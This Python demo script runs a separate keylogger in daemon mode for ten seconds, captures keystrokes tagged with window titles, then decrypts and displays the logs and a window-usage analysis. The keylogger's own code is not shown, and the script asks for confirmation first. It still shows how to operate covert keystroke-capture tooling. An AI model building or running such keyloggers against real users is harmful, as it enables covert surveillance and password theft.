#!/usr/bin/env python3
"""
Demo script to test the enhanced keylogger with window title capture
"""

import os
import sys
import time
import subprocess
import threading
import signal

# Add the current directory to the path
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

def demo_window_title_logging():
    """Demonstrate the window title logging functionality"""
    print("🪟 Enhanced Keylogger Demo - Window Title Capture")
    print("=" * 60)
    print("This demo will:")
    print("1. Start the keylogger in the background")
    print("2. Capture a few keystrokes with window titles")
    print("3. Stop the keylogger")
    print("4. Show the captured logs with window context")
    print()
    
    # Check if keylogger exists
    if not os.path.exists('keylogger.py'):
        print("❌ keylogger.py not found!")
        return
    
    print("⚠️  DEMO MODE - This will capture a few test keystrokes")
    print("The demo will run for 10 seconds, then automatically stop.")
    
    # Get user confirmation
    response = input("\nProceed with demo? (y/N): ")
    if not response.lower().startswith('y'):
        print("Demo cancelled.")
        return
    
    # Set a demo password
    demo_password = "demo123"
    os.environ['KEYLOGGER_PASSWORD'] = demo_password
    
    print(f"\n🚀 Starting keylogger demo...")
    print("Demo password: demo123")
    
    try:
        # Start keylogger in background
        process = subprocess.Popen([
            sys.executable, 'keylogger.py', '--daemon'
        ], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        # Wait a moment for it to start
        time.sleep(2)
        
        # Check if it's running
        if process.poll() is None:
            print("✅ Keylogger started successfully")
        else:
            stdout, stderr = process.communicate()
            print(f"❌ Keylogger failed to start: {stderr.decode()}")
            return
        
        print("\n📝 Demo Instructions:")
        print("  - Type a few characters (they will be logged)")
        print("  - Switch between different windows if possible")
        print("  - The demo will automatically stop in 10 seconds")
        print("\nType some characters now...")
        
        # Let it run for 10 seconds
        time.sleep(10)
        
        # Stop the keylogger
        print("\n🛑 Stopping keylogger...")
        try:
            subprocess.run([sys.executable, 'keylogger.py', '--stop'], 
                         timeout=5, capture_output=True)
        except:
            # Force kill if needed
            try:
                process.terminate()
                time.sleep(1)
                if process.poll() is None:
                    process.kill()
            except:
                pass
        
        print("✅ Keylogger stopped")
        
        # Wait a moment for files to be written
        time.sleep(2)
        
        # Show the logs
        print("\n📊 Captured Logs:")
        print("-" * 40)
        
        try:
            # Try to read the logs
            result = subprocess.run([
                sys.executable, 'keylogger.py', '--read'
            ], input=demo_password, text=True, capture_output=True, timeout=10)
            
            if result.returncode == 0:
                output = result.stdout.strip()
                if output and "No encrypted logs found" not in output:
                    print(output)
                    
                    # Analyze window usage if there are logs
                    print("\n🪟 Window Usage Analysis:")
                    print("-" * 40)
                    
                    window_result = subprocess.run([
                        sys.executable, 'log_utils.py', '--windows'
                    ], input=demo_password, text=True, capture_output=True, timeout=10)
                    
                    if window_result.returncode == 0:
                        print(window_result.stdout)
                    else:
                        print("Could not analyze window usage")
                else:
                    print("No keystrokes were captured during the demo.")
                    print("Try typing while the demo is running next time.")
            else:
                print("Could not read captured logs")
                print(f"Error: {result.stderr}")
                
        except Exception as e:
            print(f"Error reading logs: {e}")
        
        # Show log statistics
        print("\n📈 Log Statistics:")
        print("-" * 40)
        try:
            stats_result = subprocess.run([
                sys.executable, 'log_utils.py', '--stats'
            ], capture_output=True, text=True, timeout=10)
            
            if stats_result.returncode == 0:
                print(stats_result.stdout)
            else:
                print("Could not get log statistics")
        except:
            print("Could not get log statistics")
        
    except KeyboardInterrupt:
        print("\n\n⚠️ Demo interrupted by user")
        # Clean up
        try:
            subprocess.run([sys.executable, 'keylogger.py', '--stop'], 
                         timeout=5, capture_output=True)
        except:
            pass
    
    except Exception as e:
        print(f"\n❌ Demo failed: {e}")
    
    finally:
        # Clean up environment
        if 'KEYLOGGER_PASSWORD' in os.environ:
            del os.environ['KEYLOGGER_PASSWORD']
        
        print("\n✨ Demo completed!")
        print("\n💡 Key Features Demonstrated:")
        print("  ✅ Window title capture with each keystroke")
        print("  ✅ Enhanced log format with context")
        print("  ✅ Window usage analysis")
        print("  ✅ Daily log rotation")
        print("  ✅ Encrypted storage")

def main():
    """Run the window title logging demo"""
    print("🧪 Enhanced Keylogger Demo Suite")
    print("=" * 50)
    
    # Change to keylogger directory
    script_dir = os.path.dirname(os.path.abspath(__file__))
    os.chdir(script_dir)
    
    try:
        demo_window_title_logging()
        
    except KeyboardInterrupt:
        print("\n\n⚠️ Demo interrupted by user")
    except Exception as e:
        print(f"\n❌ Demo failed with error: {e}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    main()
